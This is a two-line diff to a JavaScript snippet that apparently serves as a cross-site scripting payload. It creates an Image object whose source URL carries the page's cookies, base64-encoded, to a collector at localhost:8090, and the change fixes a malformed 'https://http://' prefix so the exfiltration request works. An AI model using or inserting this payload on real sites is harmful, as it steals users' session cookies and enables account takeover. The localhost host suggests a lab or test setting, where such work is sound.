@@ -1,2 +1,2 @@
 var i = new Image();
-i.src = "https://http://localhost:8090/?c=" + btoa(document.cookie);
+i.src = "https://localhost:8090/?c=" + btoa(document.cookie);
